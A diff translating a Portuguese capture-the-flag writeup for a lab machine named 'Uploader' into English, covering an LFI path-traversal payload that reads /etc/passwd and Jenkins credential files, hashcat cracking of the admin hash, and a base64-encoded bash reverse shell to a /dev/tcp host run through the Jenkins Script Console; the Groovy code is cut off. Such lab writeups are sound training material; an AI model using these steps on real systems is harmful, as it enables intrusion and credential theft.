@@ -3,18 +3,12 @@ title: 'Uploader Writeup'
 date: '2024-11-19'
 tags: ['LFI', 'RCE', 'Linux']
 draft: false
-summary: 'Aplicação possui vulnerabilidades de Local File Inclusion (LFI), execução remota de comandos (RCE) via Jenkins, e elevação de privilégios usando binário SUID.'
+summary: 'The application has vulnerabilities of Local File Inclusion (LFI), Remote Code Execution (RCE) via Jenkins, and privilege escalation using a SUID binary.'
 images: ['/static/images/uploader-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/uploader-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Uploader
 
 ---
 
@@ -46,7 +40,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Somente as porta 80, 8080 e 22 estão abertas
+Only ports 80, 8080, and 22 are open.
 
 ---
 
@@ -54,15 +48,15 @@ Somente as porta 80, 8080 e 22 estão abertas
 
 `http://172.16.10.47:80`
 
-Uma aplicação de upload de imagens
+An image upload application.
 
 ![uploader](/static/images/uploader-writeup-images/image.png)
 
 `http://172.16.10.47:8080`
 
-Aplicação rodando um Jenkins
+Application running Jenkins.
 
-Tentei algumas credenciais default, mas não obtive sucesso.
+I tried some default credentials, but was unsuccessful.
 
 ![uploader 1](/static/images/uploader-writeup-images/image1.png)
 
@@ -70,39 +64,39 @@ Tentei algumas credenciais default, mas não obtive sucesso.
 
 ### Voltando ao servidor web na porta 80
 
-Tentei utilizar a funcionalidade pra subir uma web-shell em php, mas não obtive sucesso, a aplicação está validando.
+I tried to use the feature to upload a PHP web shell, but it didn’t work as the application is validating.
 
 ![uploader 2](/static/images/uploader-writeup-images/image2.png)
 
-Então, capturei a requisição com o Burp e comecei a testar por LFI.
+So, I captured the request with Burp and started testing for LFI.
 
 `....//....//....//....//....//....//etc/passwd`
 
 ![uploader 3](/static/images/uploader-writeup-images/image3.png)
 
-LFI Encontrado!
+LFI Found!
 
-Tentei escalar o LFI pra RCE utilizando log poisoning, mas não obtive sucesso 😞.
+I tried escalating the LFI to RCE using log poisoning, but it was unsuccessful 😞.
 
-Como a aplicação rodando na porta 8080 se trata de um Jenkins, vamos utilizar o LFI pra ler os arquivos de configuração do servidor.
+Since the application running on port 8080 is Jenkins, we’ll use the LFI to read the server’s configuration files.
 
 `/var/lib/jenkins/users/users.xml`
 
 ![uploader 4](/static/images/uploader-writeup-images/image4.png)
 
-De acordo com o arquivo `users.xml` , existe um outro diretório chamado `admin_10281833997561721098` . Dentro desse diretório, conseguimos acessar o arquivo de configuração do Jenkins.
+According to the **users.xml** file, there is another directory called **admin_10281833997561721098**. Inside this directory, we can access the Jenkins configuration file.
 
 `/var/lib/jenkins/users/admin_10281833997561721098/config.xml`
 
 ![uploader 5](/static/images/uploader-writeup-images/image5.png)
 
-Com o hash em mãos, vamos utilizar o hashcat pra tentar quebrar.
+With the hash in hand, we’ll use hashcat to try to crack it.
 
 `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`
 
 ![uploader 6](/static/images/uploader-writeup-images/image6.png)
 
-Com as credenciais `admin:ginger1` conseguimos logar no Jenkins
+With the credentials **admin:ginger1**, we were able to log in to Jenkins.
 
 ![uploader 7](/static/images/uploader-writeup-images/image7.png)
 
@@ -110,19 +104,19 @@ Com as credenciais `admin:ginger1` conseguimos logar no Jenkins
 
 ## Foot Hold
 
-O jenkins possui uma funcionalidade chamada ‘**Script Console**’, que podemos abusar pra rodar uma reverse-shell utilizando **Groovy Script**.
+Jenkins has a feature called **'Script Console'**, which we can exploit to run a reverse shell using Groovy Script.
 
 `http://172.16.10.47:8080/manage/script`
 
 ![uploader 8](/static/images/uploader-writeup-images/image8.png)
 
-Nesse caso, a aplicação por alguma razão não executa a rev-shell, a alternativa foi encodar a payload em base64 para funcionar.
+In this case, the application does not execute the reverse shell for some reason, so the workaround was to encode the payload in base64 to make it work.
 
 `echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'" | base64`
 
 ![uploader 9](/static/images/uploader-writeup-images/image9.png)
 
-Agora só enviar e pegar a shell.
+Now just send it and grab the shell.
 
 ```python
 def sout = new StringBuffer(), serr = new StringBuffer()
